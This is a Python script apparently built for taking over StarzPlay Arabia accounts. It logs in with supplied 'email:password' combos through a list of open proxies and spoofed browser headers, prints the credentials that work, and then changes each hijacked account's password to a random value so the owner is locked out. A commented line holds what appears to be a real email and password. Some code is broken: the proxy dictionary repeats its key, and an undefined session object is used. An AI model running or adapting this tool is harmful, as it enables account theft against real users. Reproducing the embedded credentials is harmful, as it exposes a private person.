import requests
import time
import random

# part1:
# Login

url = "https://arabia.starzplay.com/api/esb/userAccount/login"

#creds = "karim100msg@gmail.com:karimamougay123"
creds = raw_input("Email : ")

email = creds.split(":")[0].replace("@","%40")

password = creds.split(":")[1]

data = "userName="+email+"&password="+password

ldata = len(data)

headers = {
   'access-control-allow-origin':'*',
   'cache-control':'no-store, no-cache, must-revalidate',
   'origin':'https://arabia.starzplay.com',
   'referer':'https://arabia.starzplay.com/login',
   'user-agent':'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36',
   'x-requested-with':'XMLHttpRequest',
   'accept-encoding':'gzip, deflate',
   'accept-language':'es-ES,es;q=0.8',
   'content-length':str(ldata),
   'content-type':'application/x-www-form-urlencoded; charset=UTF-8',
}

proxies = {
"http":"165.227.35.11:80",
"http":"149.56.1.48:8181",
"http":"207.244.225.6:3128",
"http":"51.161.116.223:3128",
"http":"168.169.96.2:8080",
"http":"70.35.213.226:4153",
"http":"152.26.66.140:3128",
"http":"168.169.96.14:8080",
"http":"70.83.106.82:55801",
"http":"199.119.74.245:4145",
"http":"51.68.215.98:3128",
"http":"83.96.237.121:80",
"http":"207.237.148.214:8841",
"http":"51.254.98.24:80",
"http":"176.9.140.172:3128",
"http":"176.9.63.62:3128",
"http":"206.71.228.129:8841",
"http":"176.9.85.13:3128",
"http":"78.141.232.236:3128",
"http":"45.55.230.207:30405",
"http":"132.145.18.53:80",
"http":"144.202.3.40:3128",
"http":"185.134.23.198:80",
}

login = requests.post(url,headers=headers,data=data,proxies=proxies)

if login.status_code == 200:
  if 'sessionToken' in login.text:
   print "[+] Logged Successfully"
   print "[+] Email   : "+email.replace('%40','@')
   print "[+] Password: "+password
  else:
   print "[-] invalid loginID or password"
elif login.status_code == 404:
   print "[-] Not Found"
else:
   print "[*] An error has occurred."
print "#"*70
login.close()
# change password

PHPSESSID  = login.cookies["PHPSESSID"]
AWSALB     = login.cookies["AWSALB"]
AWSALBCORS = login.cookies["AWSALBCORS"]
gID        = login.json()['globalUserId'].encode()


cookie = "AWSALB="+AWSALB+";AWSALBCORS="+AWSALBCORS+";PHPSESSID="+PHPSESSID+";gID="+gID

url2 = 'https://arabia.starzplay.com/'

headers2 = {

'Host': 'arabia.starzplay.com',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0',
'Accept': '*/*',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate, br',
'Connection': 'keep-alive',
'Cookie': cookie ,

}

of = requests.get(url2,headers=headers2)
of.close()

url3 = "https://arabia.starzplay.com/api/esb/userAccount/profile/changePassword"

letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@."

newpassword = ''.join(random.choice(letters) for i in range(10) )



data2 = "currentPassword="+password+"&newPassword="+newpassword

ldata2 = len(data2)


headers3 = {

'Host': 'arabia.starzplay.com',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0',
'Accept': '*/*',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate, br',
'Referer': 'https://arabia.starzplay.com/settings',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'X-Requested-With': 'XMLHttpRequest',
'Content-Length': str(ldata2),
'Origin': 'https://arabia.starzplay.com',
'Connection': 'keep-alive',
'Cookie': cookie ,

}

cpass = s.post(url3,headers=headers3,data=data2,proxies=proxies)

if cpass.status_code == 200:
  if  'success' in cpass.text:
   print "[+] Password Changed Successfully"
   print "[+] Email   : "+email.replace('%40','@')
   print "[+] Password: "+newpassword
  else:
   print "[-] invalid password"
elif cpass.status_code == 404:
   print "[-] Not Found"
else:
   print "[*] An error has occurred."
print "#"*70


cpass.close()

